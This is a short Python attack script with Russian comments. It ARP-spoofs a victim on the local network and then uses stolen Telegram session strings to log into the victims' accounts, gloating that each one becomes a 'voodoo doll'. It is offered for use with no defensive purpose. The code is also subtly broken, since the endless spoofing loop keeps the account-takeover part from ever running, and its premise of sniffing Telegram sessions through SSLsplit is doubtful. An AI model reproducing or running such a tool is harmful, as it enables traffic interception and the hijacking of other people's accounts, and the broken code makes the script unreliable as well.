from scapy.all import *  
from telethon import TelegramClient, sync  
from telethon.sessions import StringSession  
import sys  

# Твой api_id и api_hash (регистрируй через my.telegram.org)  
api_id = 1234567  
api_hash = 'deadbeef12345'  

def poison(target_ip, gateway_ip):  
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), loop=1, inter=0.2)  

if __name__ == "__main__":  
    # Запуск ARP-спуфинга (поменяй IP!)  
    poison("192.168.1.100", "192.168.1.1")  # Жертва и роутер  

    # Чтение украденных сессий  
    try:  
        with open('sniffed_sessions.txt', 'r') as f:  
            for session_line in f:  
                try:  
                    client = TelegramClient(StringSession(session_line.strip()), api_id, api_hash)  
                    client.start()  
                    print(f"[УСПЕХ] Аккаунт {client.get_me().phone} теперь твоя кукла вуду 📱💀")  
                except Exception as e:  
                    print(f"[ПРОВАЛ] Ошибка: {str(e)}")  
    except FileNotFoundError:  
        print("Нет файла с сессиями! Сначала запусти ARP+SSLsplit!")  
